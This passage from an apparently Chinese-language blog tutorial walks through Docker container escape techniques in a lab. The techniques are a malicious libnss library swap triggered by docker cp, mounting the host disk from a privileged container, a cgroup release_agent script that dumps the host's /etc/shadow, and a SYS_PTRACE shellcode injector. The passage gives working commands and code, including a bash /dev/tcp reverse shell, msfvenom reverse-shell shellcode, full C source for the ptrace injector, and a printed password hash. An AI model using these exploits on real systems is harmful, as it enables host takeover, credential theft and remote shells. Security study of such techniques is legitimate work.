<p>启动受害者容器：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="builtin-name">run</span> -itd <span class="attribute">--name</span>=victim ubuntu</span><br></pre></td></tr></table></figure>

<p>复制breakout到容器并赋予执行权限：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>sudo docker cp ./breakout <span class="symbol">victim:</span>/breakout</span><br><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>sudo docker exec -it victim /bin/bash</span><br><span class="line">root<span class="variable">@e6885e01f359</span><span class="symbol">:/</span><span class="comment"># chmod 777 /breakout</span></span><br></pre></td></tr></table></figure>

<p>将容器内原有的libnss_files.so拷贝到容器根目录并重命名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@e6885e01f359:/<span class="comment"># ls -l /lib/x86_64-linux-gnu/ | grep libnss_files</span></span><br><span class="line">-rw-r--r--  1 root root   51832 Dec 16  2020 libnss_files-2.31.so</span><br><span class="line">lrwxrwxrwx  1 root root      20 Dec 16  2020 libnss_files.so.2 -&gt; libnss_files-2.31.so</span><br><span class="line">root@e6885e01f359:/<span class="comment"># cp /lib/x86_64-linux-gnu/libnss_files-2.31.so /original_libnss_files.so.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意：这里也可以从宿主机复制</span></span><br><span class="line">readlink /lib/x86_64-linux-gnu/libnss_files.so.2 <span class="comment">#确定复制的文件</span></span><br><span class="line">shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2</span><br></pre></td></tr></table></figure>

<p>将恶意文件复制到容器/lib/x86_64-linux-gnu/目录并重名名为libnss_files.so.2:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2</span><br></pre></td></tr></table></figure>

<p>执行docker cp，并查看结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker cp victim:/etc/passwd ./</span><br><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="built_in">exec</span> -it /bin/bash</span><br><span class="line"><span class="string">&quot;docker exec&quot;</span> requires at least 2 arguments.</span><br><span class="line">See <span class="string">&#x27;docker exec --help&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Usage:  docker <span class="built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line"></span><br><span class="line">Run a <span class="built_in">command</span> <span class="keyword">in</span> a running container</span><br><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="built_in">exec</span> -it victim /bin/bash</span><br><span class="line">root@82371c2be22f:/<span class="comment"># ls host_fs/</span></span><br><span class="line">bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var  vmlinuz  vmlinuz.old</span><br><span class="line">root@82371c2be22f:/<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现已经将宿主机的根目录挂载进来容器的host_fs目录，可以进行逃逸了。</p>
<h2 id="4-通过Capabilities进行逃逸"><a href="#4-通过Capabilities进行逃逸" class="headerlink" title="4. 通过Capabilities进行逃逸"></a>4. 通过Capabilities进行逃逸</h2><h3 id="4-1-理解linux-Capabilities"><a href="#4-1-理解linux-Capabilities" class="headerlink" title="4.1 理解linux Capabilities"></a>4.1 理解linux Capabilities</h3><p>Linux内核中的Capabilities特性用于划分特权集，以便进程可以只分配“执行特定功能”的特权。<br> 在引入此特性前，如果进程需要使用网络，则必须使用root来运行，通常是sudo或者添加suid，那么普通用户在使用ping时，ping就可以运行任何特权。引入Capabilities特性后，可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。缺省ping具有cap_net_admin和cap_net_raw特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">getcap</span> /bin/ping</span><br><span class="line">/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>

<p>在 Linux 中的 Capabilities 是通过 extended attributes 中的 security 命名空间实现的,selinux也是一样</p>
<p>可以通过查看进程/proc/xxxx/status，来检查进程的特权集，并通过capsh来解码得到具体的特权集。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ps -ef | grep dockerd | grep -v grep</span><br><span class="line">root        466      1  0 02:01 ?        00:00:14 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">➜  ~ cat /proc/466/status | grep Cap</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>

<p>使用capsh可以翻译出每个BIT的含义，3=0011表示2个bit，f=1111表示4个bit，一共2+4+4+4+4+4+4+4+4+4=38bit，从后先前，每个bit代表一种特权，一共38种特权集.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>



<h3 id="4-2-Docker中的Capabilities"><a href="#4-2-Docker中的Capabilities" class="headerlink" title="4.2 Docker中的Capabilities"></a>4.2 Docker中的Capabilities</h3><p>Docker 也支持 Capabilities ,在运行容器的时候可以通过指定 –privileded 参数来开启容器的所有CAP，可以通过–cap-add 和 –cap-drop 这两个参数来调整.</p>
<ul>
<li><p>使用–privileged可以获得所有特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">22f11286c7689741930816751d57b69038bcabe1fe2f9a0a62d8c1c58aa1898c</span><br><span class="line">➜  ~ ps -ef | grep httpd</span><br><span class="line">root       4733   4711  0 16:38 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">root       4799   4120  0 16:38 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox httpd</span><br><span class="line">➜  ~ cat /proc/4733/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	0000003fffffffff</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure></li>
<li><p>使用–cap-add=ALL也可以获得所有特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name test-all -td --cap-add=ALL busybox /bin/httpd -f</span><br><span class="line">2a2d0f9fcf2012c59b1493060b42b0d164f448e07d5b9229f7973db081fd289f</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5277   5256  0 16:42 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5277/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	0000003fffffffff</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure></li>
<li><p>拥有 SYS_ADMIN 权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name <span class="built_in">test</span> -td --cap-add=SYS_ADMIN busybox /bin/httpd -f</span><br><span class="line">12e311138f8638f602712e3abe9e42cbb4bfc5de39d14803c2c88893b8905bc7</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5561   5540  0 16:48 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5561/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	00000000a82425fb</span><br><span class="line">CapPrm:	00000000a82425fb</span><br><span class="line">CapEff:	00000000a82425fb</span><br><span class="line">CapBnd:	00000000a82425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">➜  ~ capsh --decode=00000000a82425fb</span><br><span class="line">0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-3-完全特权特权进行逃逸"><a href="#4-3-完全特权特权进行逃逸" class="headerlink" title="4.3 完全特权特权进行逃逸"></a>4.3 完全特权特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。====</p>
<ol>
<li><p>启动一个特权容器环境</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm --privileged ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>==使用–cap-add=ALL也可以获得所有特权集，是一样的效果==</p>
</li>
<li><p>判断挂载的磁盘</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">fdisk -l #查看逻辑磁盘看不到切换到<span class="regexp">/dev目录通过fdisk -l /</span>dev/dm-<span class="number">0</span>判断</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bf0b7fcd75d1:/<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x15ec275c</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *        2048 83982335 83980288   40G 83 Linux</span><br><span class="line">/dev/sda2       83984382 85981183  1996802  975M  5 Extended</span><br><span class="line">/dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris</span><br></pre></td></tr></table></figure>

<p>这里很轻易可以判断出是/dev/sda1</p>
</li>
<li><p>容器内创建挂载的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /shadowtest</span><br></pre></td></tr></table></figure></li>
<li><p>将宿主机目录挂载到容器内目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 /shadowtest</span><br></pre></td></tr></table></figure></li>
<li><p>切换到挂载的宿主机目录</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">chroot <span class="string">/shadowtest</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bf0b7fcd75d1:/<span class="comment"># chroot /shadowtest</span></span><br><span class="line"><span class="comment"># cat /etc/passwd | grep shadowflow</span></span><br><span class="line">shadowflow:x:1000:1000:shadowflow,,,:/home/shadowflow:/bin/bash</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
<li><p>通过反弹shell或者定时任务写入ssh key等方式进行利用</p>
<p>这里我们反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:44584.</span><br><span class="line">root@bf0b7fcd75d1:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-4-通过SYS-ADMIN逃逸"><a href="#4-4-通过SYS-ADMIN逃逸" class="headerlink" title="4.4 通过SYS_ADMIN逃逸"></a>4.4 通过SYS_ADMIN逃逸</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">--cap-add</span>=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">poc</a>: release_agent.sh</p>
<p>修改为<code>cat /etc/shadow</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">set -uex</span><br><span class="line"></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"> </span><br><span class="line">echo 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br><span class="line">echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent</span><br><span class="line"> </span><br><span class="line">echo &#x27;#!/bin/sh&#x27; &gt; /cmd</span><br><span class="line">echo &quot;cat /etc/shadow &gt; $host_path/output&quot; &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line"> </span><br><span class="line">sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line">cat &quot;/output&quot;</span><br></pre></td></tr></table></figure>

<p>只要我们结果中可以看到宿主机的用户表示我们成功逃逸</p>
<p><strong>漏洞利用成功有如下前提：</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">在容器内root用户</span><br><span class="line">容器必须使用SYS_ADMIN Linux capability运行</span><br><span class="line">容器必须缺少AppArmor配置文件，否则将允许mount <span class="keyword">syscall</span></span><br><span class="line"><span class="keyword"></span>cgroup <span class="built_in">v1</span>虚拟文件系统必须以读写方式安装在容器内部</span><br></pre></td></tr></table></figure>

<p>启动漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name <span class="built_in">test</span> -itd --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --rm debian /bin/bash</span><br></pre></td></tr></table></figure>

<p>将poc导入到容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp release_agent.sh <span class="built_in">test</span>:/root/</span><br></pre></td></tr></table></figure>

<p>进入容器执行：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker exec -it test <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@826a9c2d8457:/<span class="comment"># bash /root/release_agent.sh</span></span><br><span class="line">......</span><br><span class="line">hplip:*:18848:0:99999:7:::</span><br><span class="line">shadowflow:$6$oAwaNvbnhpdcJooQ<span class="variable">$Ng3O0KGA9</span>/TZghLbmPXGWBS1UDaPH9fqgxAhemNwmq9GA2rnfeJNQ68wrf2XcNQBWC3QEhHNz.e9WrzjOst6d0:18848:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18848::::::</span><br></pre></td></tr></table></figure>



<h3 id="4-5-通过SYS-PTRACE逃逸"><a href="#4-5-通过SYS-PTRACE逃逸" class="headerlink" title="4.5 通过SYS_PTRACE逃逸"></a>4.5 通过SYS_PTRACE逃逸</h3><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
<p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name test -itd <span class="attribute">--cap-add</span>=SYS_PTRACE <span class="attribute">--pid</span>=host --security-opt <span class="attribute">apparmor</span>=unconfined --rm ubuntu</span><br></pre></td></tr></table></figure>

<p><strong>利用成功前提：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">--cap-add</span>=SYS_PTRACE</span><br><span class="line"><span class="attribute">--pid</span>=host</span><br><span class="line">--security-opt <span class="attribute">apparmor</span>=unconfined</span><br></pre></td></tr></table></figure>



<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>

<p>移动到容器：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker cp infect test:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SimpleHTTPServer <span class="number">55555</span></span><br></pre></td></tr></table></figure>

<p>查看python server进程:7365</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  poc docker cp infect <span class="built_in">test</span>:/root/</span><br><span class="line">➜  poc docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br><span class="line">root@f147ae171646:/<span class="comment"># ps -ef | grep 5555</span></span><br><span class="line">root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555</span><br><span class="line">root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555</span><br><span class="line">root@f147ae171646:/<span class="comment"># /root/infect 15260</span></span><br><span class="line">+ Tracing process 15260</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7fdb32ef77e4</span><br><span class="line">+ Setting instruction pointer to 0x7fdb32ef77e6</span><br><span class="line">+ Run it!</span><br><span class="line">root@f147ae171646:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> 结果：</p>
